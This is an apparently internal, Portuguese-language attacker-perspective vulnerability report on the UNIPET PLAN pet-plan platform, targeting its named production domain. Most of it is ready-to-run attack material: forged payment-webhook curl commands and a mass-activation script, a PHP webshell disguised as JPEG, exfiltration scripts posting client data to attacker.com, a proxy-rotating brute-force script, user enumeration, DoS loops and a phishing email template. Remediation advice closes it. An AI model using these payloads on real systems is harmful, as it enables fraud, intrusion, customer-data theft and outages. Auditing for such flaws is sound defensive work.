# 🎯 Vetores de Ataque - Análise de Exploração por Hackers

**Sistema:** UNIPET PLAN  
**Foco:** Exploração prática de vulnerabilidades  
**Perspectiva:** Atacante/Pentester

---

## 🚨 ATAQUES CRÍTICOS - EXPLORAÇÃO IMEDIATA

### 🔓 ATAQUE 1: Bypass Completo de Autenticação Admin

**Vetor de Ataque:** Manipulação de variáveis de ambiente  
**Arquivo:** `server/auth.ts` (linhas 58-76)  
**Severidade:** CRÍTICA 🔴

#### Como o Hacker Exploraria:

**Cenário 1 - Configuração Incorreta em Produção:**
```bash
# Se o servidor estiver configurado incorretamente:
export NODE_ENV=development
npm start

# OU se o deploy foi feito com .env errado:
NODE_ENV=development node server/index.js
```

**Resultado:** 
- ✅ Acesso administrativo completo SEM credenciais
- ✅ Permissões de superadmin (`permissions: ['all']`)
- ✅ Bypass total de autenticação

**Passo a Passo do Ataque:**

1. **Reconhecimento:**
   ```bash
   # Verificar headers de resposta
   curl -I https://unipetplan.com.br/admin
   
   # Procurar por indicadores de ambiente
   X-Powered-By: Express
   X-Environment: development  # ← Jackpot!
   ```

2. **Exploração:**
   ```bash
   # Tentar acessar dashboard admin
   curl https://unipetplan.com.br/admin/api/dashboard/all
   
   # Se NODE_ENV=development, retorna dados COMPLETOS:
   {
     "clients": [...],
     "payments": [...],
     "pets": [...],
     "revenue": 150000,
     "contracts": [...]
   }
   ```

3. **Escalação:**
   ```javascript
   // Script para exfiltrar todos os dados
   const endpoints = [
     '/admin/api/clients',
     '/admin/api/pets', 
     '/admin/api/contracts',
     '/admin/api/payments',
     '/admin/api/network-units',
     '/admin/api/users'
   ];
   
   for (const endpoint of endpoints) {
     const data = await fetch(`https://unipetplan.com.br${endpoint}`);
     console.log(await data.json());
   }
   ```

**Impacto Financeiro:**
- 💰 Acesso a TODOS os dados de clientes (LGPD)
- 💰 Acesso a dados de pagamento (PCI-DSS)
- 💰 Capacidade de modificar/deletar qualquer registro
- 💰 Multa LGPD: até R$ 50 milhões
- 💰 Perda de confiança: clientes abandonam serviço

---

### 💳 ATAQUE 2: Manipulação de Webhook de Pagamento

**Vetor de Ataque:** Forjar notificações de pagamento sem validação  
**Arquivo:** `server/services/cielo-webhook-service.ts` + `server/config.ts`  
**Severidade:** CRÍTICA 🔴

#### Como o Hacker Exploraria:

**Cenário - CIELO_WEBHOOK_SECRET Não Configurado:**

O código **PERMITE** deploy em produção sem o secret (linha 204 de config.ts):
```typescript
console.warn('🚨 AVISO: Webhook security desabilitado temporariamente para deploy');
// ← NÃO LANÇA ERRO, APENAS WARNING
```

**Passo a Passo do Ataque:**

1. **Reconhecimento:**
   ```bash
   # Tentar enviar webhook sem assinatura
   curl -X POST https://unipetplan.com.br/api/webhooks/cielo \
     -H "Content-Type: application/json" \
     -d '{
       "PaymentId": "test-12345",
       "ChangeType": 1
     }'
   
   # Se responder 401 "Assinatura inválida" → protegido
   # Se processar → VULNERÁVEL!
   ```

2. **Exploração - Aprovar Pagamento Falso:**
   ```bash
   # Criar payload de pagamento aprovado
   curl -X POST https://unipetplan.com.br/api/webhooks/cielo \
     -H "Content-Type: application/json" \
     -H "X-Correlation-ID: fake-correlation-123" \
     -d '{
       "PaymentId": "00000000-0000-0000-0000-000000000001",
       "ChangeType": 1,
       "ClientOrderId": "CONTRACT-00001",
       "RecurrentPaymentId": null
     }'
   ```

3. **Impacto:**
   ```typescript
   // O sistema processaria e aprovaria:
   - Contrato ativado sem pagamento real
   - Pet com plano ativo (acesso a serviços)
   - Comprovante de pagamento gerado
   - Status alterado para "paid" no banco
   ```

4. **Escalação Massiva:**
   ```javascript
   // Script para ativar TODOS os contratos sem pagar
   const contracts = await fetch('/api/contracts/pending').then(r => r.json());
   
   for (const contract of contracts) {
     await fetch('/api/webhooks/cielo', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         PaymentId: crypto.randomUUID(),
         ChangeType: 1,  // Aprovado
         ClientOrderId: contract.id
       })
     });
   }
   
   // Resultado: Todos os contratos ativos SEM PAGAMENTO
   ```

**Impacto Financeiro:**
- 💰 Perda total da receita mensal/anual
- 💰 Fraude em larga escala (centenas de contratos)
- 💰 Responsabilização criminal por fraude
- 💰 Processo judicial da Cielo
- 💰 Bloqueio da conta de pagamentos

---

### 🗄️ ATAQUE 3: SQL Injection via TypeScript Undefined

**Vetor de Ataque:** Explorar erros de tipo que causam queries malformadas  
**Arquivo:** `server/routes.ts` (99 erros LSP)  
**Severidade:** CRÍTICA 🔴

#### Como o Hacker Exploraria:

**Cenário - Dados `undefined` em Operações de Banco:**

```typescript
// Código vulnerável (linha 2895-2916):
const creditCardRequest = {
  customer: {
    name: validatedPaymentData.customer.name || // ← pode ser undefined
           validatedPaymentData.payment.holder || 'Cliente',
  },
  payment: {
    creditCard: {
      cardNumber: validatedPaymentData.payment.cardNumber, // ← undefined!
      holder: validatedPaymentData.payment.holder,
      // ...
    }
  }
};
```

**Passo a Passo do Ataque:**

1. **Reconhecimento:**
   ```bash
   # Testar endpoint de checkout com dados faltando
   curl -X POST https://unipetplan.com.br/api/checkout/process \
     -H "Content-Type: application/json" \
     -d '{
       "customer": {},
       "payment": {}
     }'
   ```

2. **Resposta do Sistema:**
   ```json
   {
     "error": "Cannot read property 'cardNumber' of undefined",
     "stack": "at /server/routes.ts:2913:45"
   }
   ```
   ↑ **Vazamento de informação** - Hacker sabe que há validação fraca

3. **Exploração - Crash do Sistema:**
   ```javascript
   // Enviar payloads que causam undefined
   const maliciousPayloads = [
     { customer: null, payment: { cardNumber: "1234" } },
     { customer: { name: "" }, payment: undefined },
     { payment: { holder: null, cardNumber: undefined } }
   ];
   
   // Resultado: Sistema crasha ou comportamento imprevisível
   ```

4. **Ataque DoS (Negação de Serviço):**
   ```bash
   # Script para derrubar o servidor
   for i in {1..1000}; do
     curl -X POST https://unipetplan.com.br/api/checkout/process \
       -H "Content-Type: application/json" \
       -d '{"customer":null,"payment":null}' &
   done
   
   # Sistema fica sobrecarregado com erros e para de responder
   ```

**Impacto Operacional:**
- 💥 Sistema indisponível para clientes legítimos
- 💥 Perda de vendas durante downtime
- 💥 Dados corrompidos no banco
- 💥 Custos de recuperação e investigação

---

### 📤 ATAQUE 4: Upload de Malware Disfarçado

**Vetor de Ataque:** Bypass de validação de tipo de arquivo  
**Arquivo:** `server/routes.ts` (linhas 87-109)  
**Severidade:** ALTA 🟠

#### Como o Hacker Exploraria:

**Problema:** Sistema valida apenas MIME type e extensão (facilmente falsificados)

**Passo a Passo do Ataque:**

1. **Criar Arquivo Malicioso:**
   ```bash
   # Criar webshell PHP disfarçado de imagem
   cat > malicious.jpg << 'EOF'
   <?php
   if(isset($_GET['cmd'])) {
     system($_GET['cmd']);
   }
   ?>
   EOF
   
   # Adicionar header JPEG fake
   printf '\xFF\xD8\xFF\xE0' | cat - malicious.jpg > webshell.jpg
   ```

2. **Falsificar MIME Type:**
   ```bash
   curl -X POST https://unipetplan.com.br/admin/api/pets/upload-image \
     -H "Content-Type: multipart/form-data" \
     -F "image=@webshell.jpg;type=image/jpeg"
   
   # Sistema aceita porque:
   # - MIME type = image/jpeg ✓
   # - Extensão = .jpg ✓
   # - Conteúdo NÃO é validado ✗
   ```

3. **Resultado:**
   ```json
   {
     "success": true,
     "imageUrl": "https://storage.supabase.co/pets/webshell-123.jpg"
   }
   ```

4. **Exploração da Webshell:**
   ```bash
   # Se Supabase executar PHP (improvável, mas ilustrativo):
   curl "https://storage.supabase.co/pets/webshell-123.jpg?cmd=whoami"
   # Retorna: www-data
   
   # Comandos maliciosos:
   curl "https://.../webshell-123.jpg?cmd=cat /etc/passwd"
   curl "https://.../webshell-123.jpg?cmd=ls -la /var/www"
   curl "https://.../webshell-123.jpg?cmd=wget http://attacker.com/backdoor.sh"
   ```

5. **Escalação - Polyglot File (JPEG + JS):**
   ```javascript
   // Criar arquivo que é JPEG válido E JavaScript válido
   /*\xFF\xD8\xFF\xE0*/
   const xhr = new XMLHttpRequest();
   xhr.open('GET', '/admin/api/clients');
   xhr.onload = () => {
     fetch('https://attacker.com/exfil', {
       method: 'POST',
       body: xhr.responseText
     });
   };
   xhr.send();
   /*\xFF\xD9*/
   ```

**Impacto:**
- 🎯 Execução remota de código (RCE)
- 🎯 Acesso ao servidor e banco de dados
- 🎯 Roubo de secrets (.env, DATABASE_URL)
- 🎯 Instalação de backdoors persistentes
- 🎯 Mineração de criptomoedas no servidor

---

## 🔥 ATAQUES DE ALTA PRIORIDADE

### 💸 ATAQUE 5: Manipulação de Valores de Pagamento

**Vetor de Ataque:** Race condition em validação de valores  
**Arquivo:** `server/routes.ts` (checkout process)  
**Severidade:** ALTA 🟠

#### Como o Hacker Exploraria:

**Cenário - Double-Submit com Valores Diferentes:**

1. **Interceptar Request de Checkout:**
   ```javascript
   // Burp Suite ou Proxy para interceptar
   POST /api/checkout/process
   {
     "pets": [{"petId": "pet-1", "planId": "plan-premium"}],
     "payment": {
       "amount": 15000, // R$ 150,00
       "method": "credit_card",
       "cardNumber": "4111111111111111"
     }
   }
   ```

2. **Modificar Valor:**
   ```javascript
   // Alterar amount antes de enviar
   POST /api/checkout/process
   {
     "pets": [{"petId": "pet-1", "planId": "plan-premium"}],
     "payment": {
       "amount": 100, // R$ 1,00 ← ALTERADO!
       "method": "credit_card",
       "cardNumber": "4111111111111111"
     }
   }
   ```

3. **Resultado:**
   - Se validação for fraca, processa R$ 1,00
   - Plano premium ativado por R$ 1,00
   - Prejuízo: R$ 149,00 por transação

4. **Ataque em Massa:**
   ```javascript
   // Comprar 100 planos premium por R$ 1,00 cada
   for (let i = 0; i < 100; i++) {
     await fetch('/api/checkout/process', {
       method: 'POST',
       body: JSON.stringify({
         pets: [{petId: `pet-${i}`, planId: 'premium'}],
         payment: {amount: 100, method: 'credit_card', /*...*/}
       })
     });
   }
   
   // Lucro do atacante: R$ 14.900,00
   ```

---

### 🔐 ATAQUE 6: Session Fixation

**Vetor de Ataque:** Sequestrar sessão de admin  
**Arquivo:** `server/auth.ts` (sem regeneração de sessão)  
**Severidade:** ALTA 🟠

#### Como o Hacker Exploraria:

**Passo a Passo:**

1. **Obter Session ID:**
   ```bash
   # Atacante acessa o site e obtém cookie
   curl -i https://unipetplan.com.br/admin
   
   Set-Cookie: connect.sid=s%3A...abc123...; Path=/; HttpOnly
   ```

2. **Forçar Vítima a Usar Esse Session ID:**
   ```html
   <!-- Phishing email com link malicioso -->
   <a href="https://unipetplan.com.br/admin/login?session=abc123">
     Clique aqui para acessar seu painel
   </a>
   
   <!-- OU injetar cookie via XSS -->
   <script>
   document.cookie = "connect.sid=s%3A...abc123...";
   </script>
   ```

3. **Vítima Faz Login:**
   ```
   Admin digita credenciais corretas
   Sistema NÃO regenera session ID (VULNERÁVEL!)
   Session ID continua sendo "abc123"
   ```

4. **Atacante Usa a Sessão:**
   ```bash
   # Atacante usa o mesmo session ID
   curl https://unipetplan.com.br/admin/api/dashboard/all \
     -H "Cookie: connect.sid=s%3A...abc123..."
   
   # Retorna dados do admin logado!
   ```

**Impacto:**
- 🎭 Sequestro completo de sessão admin
- 🎭 Acesso a dados sensíveis
- 🎭 Modificação de configurações
- 🎭 Criação de backdoors

---

### 🌐 ATAQUE 7: CORS Misconfiguration - Data Exfiltration

**Vetor de Ataque:** Explorar CORS permissivo em desenvolvimento  
**Arquivo:** `server/config/security.ts` (linhas 40-45)  
**Severidade:** ALTA 🟠

#### Como o Hacker Exploraria:

**Cenário - Ambiente Dev Exposto:**

1. **Criar Site Malicioso:**
   ```html
   <!-- http://attacker.com/steal.html -->
   <script>
   // Explorar CORS permissivo
   fetch('https://dev.unipetplan.com.br/admin/api/clients', {
     credentials: 'include'  // Envia cookies
   })
   .then(r => r.json())
   .then(data => {
     // Exfiltrar dados
     fetch('https://attacker.com/exfil', {
       method: 'POST',
       body: JSON.stringify(data)
     });
   });
   </script>
   ```

2. **Vítima Acessa Site Malicioso:**
   ```
   Admin visita http://attacker.com/steal.html
   ↓
   Script faz requisição para dev.unipetplan.com.br
   ↓
   CORS permite (origin null em dev!)
   ↓
   Dados de clientes enviados para attacker.com
   ```

3. **Dados Roubados:**
   ```json
   {
     "clients": [
       {
         "id": "...",
         "full_name": "João Silva",
         "cpf": "123.456.789-00",
         "email": "joao@email.com",
         "phone": "(11) 98765-4321",
         "pets": [...]
       },
       // ... todos os clientes
     ]
   }
   ```

---

## ⚡ ATAQUES DE FORÇA BRUTA

### 🔨 ATAQUE 8: Brute Force em Login Admin

**Vetor de Ataque:** Rate limit muito permissivo  
**Arquivo:** `server/routes.ts` (linhas 305-311)  
**Severidade:** MÉDIA 🟡

#### Como o Hacker Exploraria:

**Problema:** 10 tentativas em 15 minutos é muito permissivo

**Passo a Passo:**

1. **Obter Lista de Emails:**
   ```bash
   # Vazamento de dados anterior, scraping, engenharia social
   admin@unipetplan.com.br
   suporte@unipetplan.com.br
   contato@unipetplan.com.br
   ```

2. **Top 10 Senhas Mais Usadas:**
   ```
   123456
   password
   12345678
   admin123
   unipet2024
   senha123
   Admin@123
   mudar123
   Password1
   admin2024
   ```

3. **Ataque Distribuído:**
   ```python
   import requests
   import time
   
   emails = [...]  # Lista de emails
   passwords = [...]  # Top 10 senhas
   
   # Usar múltiplos IPs (proxies, VPN, Tor)
   proxies = ['proxy1', 'proxy2', 'proxy3', ...]
   
   for email in emails:
       for password in passwords:
           # Rotacionar IP a cada tentativa
           proxy = proxies[attempt % len(proxies)]
           
           response = requests.post(
               'https://unipetplan.com.br/admin/api/login',
               json={'email': email, 'password': password},
               proxies={'https': proxy}
           )
           
           if response.status_code == 200:
               print(f"[+] SUCESSO! {email}:{password}")
               break
           
           time.sleep(90)  # Aguardar rate limit resetar
   ```

4. **Cálculo de Sucesso:**
   ```
   10 emails × 10 senhas = 100 tentativas
   100 tentativas ÷ 10 (por IP) = 10 IPs necessários
   Tempo total: ~15 minutos
   
   Probabilidade de quebrar senha fraca: ~30%
   ```

---

### 🕵️ ATAQUE 9: Enumeração de Usuários

**Vetor de Ataque:** Mensagens de erro diferentes  
**Severidade:** MÉDIA 🟡

#### Como o Hacker Exploraria:

1. **Testar Email Inexistente:**
   ```bash
   curl -X POST /admin/api/login \
     -d '{"email":"naaoexiste@test.com","password":"123"}'
   
   # Resposta:
   {"error": "Usuário não encontrado"}
   ```

2. **Testar Email Existente:**
   ```bash
   curl -X POST /admin/api/login \
     -d '{"email":"admin@unipetplan.com.br","password":"123"}'
   
   # Resposta:
   {"error": "Senha incorreta"}
   ```

3. **Enumerar Todos os Admins:**
   ```python
   possible_emails = [
       'admin@unipetplan.com.br',
       'suporte@unipetplan.com.br',
       'gerente@unipetplan.com.br',
       # ... lista de 1000 emails
   ]
   
   valid_emails = []
   for email in possible_emails:
       resp = requests.post('/admin/api/login', 
                           json={'email': email, 'password': 'x'})
       
       if 'Senha incorreta' in resp.text:
           valid_emails.append(email)
           print(f"[+] Email válido: {email}")
   ```

---

## 🎣 ATAQUES DE ENGENHARIA SOCIAL

### 📧 ATAQUE 10: Phishing com Session Fixation

**Combinação de Vulnerabilidades:**

1. **Criar Email Falso:**
   ```html
   De: suporte@unipetplan.com.br (spoofado)
   Assunto: [URGENTE] Problema com sua conta
   
   Olá Admin,
   
   Detectamos atividade suspeita em sua conta.
   Por favor, verifique imediatamente:
   
   https://unipetplan.com.br/admin/login?session=ATTACKER_SESSION_ID
   
   Atenciosamente,
   Equipe UNIPET PLAN
   ```

2. **Admin Clica no Link:**
   - Session ID fixado no browser
   - Admin faz login normalmente
   - Atacante tem acesso à sessão autenticada

---

## 💣 ATAQUES DE NEGAÇÃO DE SERVIÇO (DoS)

### 🌊 ATAQUE 11: Resource Exhaustion via Webhook

**Vetor:** Enviar webhooks massivos sem validação

```bash
# Script para derrubar o servidor
while true; do
  for i in {1..1000}; do
    curl -X POST https://unipetplan.com.br/api/webhooks/cielo \
      -H "Content-Type: application/json" \
      -d '{"PaymentId":"'$(uuidgen)'","ChangeType":1}' &
  done
  wait
done
```

**Resultado:**
- CPU em 100%
- Memória esgotada
- Banco de dados travado
- Sistema completamente inoperante

---

## 📊 RESUMO DE IMPACTO FINANCEIRO

| Ataque | Impacto Financeiro | Probabilidade | Severidade |
|--------|-------------------|---------------|------------|
| Bypass Auth Admin | R$ 50M (multa LGPD) | Média | CRÍTICA |
| Webhook Forgery | R$ 500K+ (fraude) | Alta | CRÍTICA |
| SQL Injection/DoS | R$ 100K (downtime) | Alta | CRÍTICA |
| Upload Malware | R$ 1M+ (breach) | Média | ALTA |
| Payment Manipulation | R$ 15K/ataque | Alta | ALTA |
| Session Fixation | R$ 50K (dados) | Média | ALTA |
| CORS Exploit | R$ 200K (LGPD) | Baixa | ALTA |
| Brute Force | R$ 50K (acesso) | Alta | MÉDIA |
| User Enumeration | - (reconnaissance) | Alta | BAIXA |
| Phishing + Fixation | R$ 100K (combinado) | Média | ALTA |

**Total de Exposição Estimada:** R$ 52+ milhões

---

## 🛡️ RECOMENDAÇÕES PRIORITÁRIAS

### ⚡ URGENTE (24-48 horas):

1. **Corrigir Bypass de Auth Admin:**
   ```typescript
   const isLocalDev = process.env.NODE_ENV === 'development' && 
                      process.env.ALLOW_DEV_BYPASS === 'true' && // ← Opt-in explícito
                      process.env.REPLIT_DEPLOYMENT !== 'true';
   ```

2. **Tornar CIELO_WEBHOOK_SECRET Obrigatório:**
   ```typescript
   if ((isProduction || isStaging) && !process.env.CIELO_WEBHOOK_SECRET) {
     throw new Error('SECURITY: Cannot start without CIELO_WEBHOOK_SECRET');
   }
   ```

3. **Corrigir Erros TypeScript:**
   - Adicionar validações null/undefined
   - Usar optional chaining
   - Validar dados antes de usar

4. **Validar Conteúdo de Upload:**
   ```typescript
   import fileType from 'file-type';
   
   const type = await fileType.fromBuffer(buffer);
   if (!type || !allowedTypes.includes(type.mime)) {
     throw new Error('Invalid file content');
   }
   ```

### 🔒 ALTA PRIORIDADE (1 semana):

1. **Regenerar Sessão após Login:**
   ```typescript
   req.session.regenerate((err) => {
     req.session.admin = { /* ... */ };
   });
   ```

2. **Restringir Rate Limits:**
   - Admin login: 3 tentativas / 15 min
   - Password verify: 3 tentativas / 5 min

3. **Corrigir CORS:**
   - Sempre validar origin
   - Nunca permitir `null` origin

4. **Adicionar Zod Validation em Webhooks:**
   ```typescript
   const webhookSchema = z.object({
     PaymentId: z.string().uuid(),
     ChangeType: z.number().int().min(1).max(3)
   });
   ```

---

## 🎯 CONCLUSÃO

O sistema UNIPET PLAN possui **10 vetores de ataque críticos e de alta severidade** que podem ser explorados por atacantes com conhecimento médio a avançado. 

**Principais Riscos:**
1. ✅ Bypass completo de autenticação
2. ✅ Fraude em pagamentos
3. ✅ Execução remota de código
4. ✅ Sequestro de sessão
5. ✅ Negação de serviço

**Ação Imediata Necessária:**
- Corrigir vulnerabilidades críticas em 48h
- Implementar monitoramento de segurança
- Realizar pentest profissional
- Criar plano de resposta a incidentes

**Sem correções, o sistema está VULNERÁVEL a ataques financeiros e comprometimento total.**
